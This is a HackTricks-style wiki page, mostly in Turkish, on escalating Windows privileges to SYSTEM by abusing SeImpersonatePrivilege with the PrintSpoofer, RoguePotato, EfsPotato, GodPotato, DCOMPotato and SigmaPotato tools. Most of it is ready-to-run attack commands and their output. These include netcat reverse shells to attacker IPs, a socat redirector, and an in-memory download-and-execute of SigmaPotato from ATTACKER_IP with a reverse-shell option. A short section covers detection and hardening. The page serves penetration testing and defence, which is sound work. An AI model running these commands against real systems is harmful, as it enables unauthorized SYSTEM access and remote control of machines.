# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato artık çalışmıyor** Windows Server 2019 ve Windows 10 build 1809 ve sonrası. Ancak, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** kullanılabilir **aynı ayrıcalıkları kullanmak ve `NT AUTHORITY\SYSTEM` seviyesinde erişim elde etmek**. Bu [blog yazısı](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` aracını derinlemesine inceliyor; bu araç JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 makinelerinde impersonation ayrıcalıklarını kötüye kullanmak için kullanılabilir.

> [!TIP]
> 2024–2025'te sıkça bakım yapılan modern bir alternatif SigmaPotato (a fork of GodPotato) olup in-memory/.NET reflection kullanımını ve genişletilmiş OS desteğini ekler. Aşağıda hızlı kullanım ve Referanslar bölümündeki repo'ya bakın.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Gereksinimler ve yaygın tuzaklar

Aşağıdaki tüm teknikler, aşağıdaki ayrıcalıklardan birine sahip bir bağlamdan impersonation yeteneği olan ayrıcalıklı bir servisi kötüye kullanmaya dayanır:

- SeImpersonatePrivilege (en yaygın) veya SeAssignPrimaryTokenPrivilege
- Token zaten SeImpersonatePrivilege içeriyorsa yüksek bütünlük (High integrity) gerekmez (IIS AppPool, MSSQL gibi birçok servis hesabı için tipiktir).

Ayrıcalıkları hızlıca kontrol edin:
```cmd
whoami /priv | findstr /i impersonate
```
Operasyonel notlar:

- PrintSpoofer, Print Spooler servisinin çalışıyor olmasını ve yerel RPC endpoint'i (spoolss) üzerinden erişilebilir olmasını gerektirir. PrintNightmare sonrası Spooler'ın devre dışı bırakıldığı sertleştirilmiş ortamlarda RoguePotato/GodPotato/DCOMPotato/EfsPotato'yu tercih edin.
- RoguePotato, TCP/135 üzerinden erişilebilir bir OXID resolver gerektirir. Egress engelliyse bir redirector/port-forwarder kullanın (aşağıdaki örneğe bakın). Eski sürümler -f flag'ini gerektiriyordu.
- EfsPotato/SharpEfsPotato MS-EFSR'i kötüye kullanır; eğer bir pipe engellenmişse, alternatif pipe'ları deneyin (lsarpc, efsrpc, samr, lsass, netlogon).
- RpcBindingSetAuthInfo sırasında görülen 0x6d3 hatası genellikle bilinmeyen/desteklenmeyen RPC kimlik doğrulama servisini gösterir; farklı bir pipe/transport deneyin veya hedef servisin çalıştığından emin olun.

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notlar:
- -i ile mevcut konsolda etkileşimli bir süreç başlatabilir veya -c ile tek satırlık bir komut çalıştırabilirsiniz.
- Spooler servisi gerektirir. Devre dışıysa, bu başarısız olur.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Eğer outbound 135 engelliyse, redirector'ınızda socat ile OXID resolver'ı pivotlayın:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
İpucu: Eğer bir pipe başarısız olursa veya EDR bunu engellerse, diğer desteklenen pipes'leri deneyin:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notes:
- SeImpersonatePrivilege mevcut olduğunda Windows 8/8.1–11 ve Server 2012–2022 genelinde çalışır.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato, varsayılan olarak RPC_C_IMP_LEVEL_IMPERSONATE olan servis DCOM nesnelerini hedefleyen iki varyant sağlar. Sağlanan ikili dosyaları derleyin veya kullanın ve komutunuzu çalıştırın:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (güncellenmiş GodPotato fork'ı)

SigmaPotato, .NET reflection aracılığıyla bellek içi yürütme ve bir PowerShell reverse shell yardımcısı gibi modern kolaylıklar ekler.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Tespit ve sertleştirme notları

- İzleyin: named pipes oluşturan ve hemen token-duplication APIs çağırıp CreateProcessAsUser/CreateProcessWithTokenW ile devam eden süreçleri. Sysmon faydalı telemetri sağlayabilir: Event ID 1 (process creation), 17/18 (named pipe created/connected), ve SYSTEM olarak çocuk süreçler başlatan komut satırları.
- Spooler hardening: Print Spooler servisinin gerekmediği sunucularda devre dışı bırakılması, spoolss aracılığıyla PrintSpoofer-style yerel coercions'u engeller.
- Service account hardening: SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege atamasını özel servislere mümkün olduğunca sınırlayın. Servisleri gerekirse en az gerekli ayrıcalıkla virtual accounts altında çalıştırmayı ve mümkünse service SID ile izole edip write-restricted tokens kullanmayı değerlendirin.
- Network controls: Çıkış TCP/135'i engellemek veya RPC endpoint mapper trafiğini kısıtlamak, dahili bir redirector yoksa RoguePotato'yu bozabilir.
- EDR/AV: Bu araçların tümü yaygın şekilde signature'lanmıştır. Recompiling from source, renaming symbols/strings, veya in-memory execution kullanmak tespiti azaltabilir ama sağlam behavioral detections'ı yenmez.

## Referanslar

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
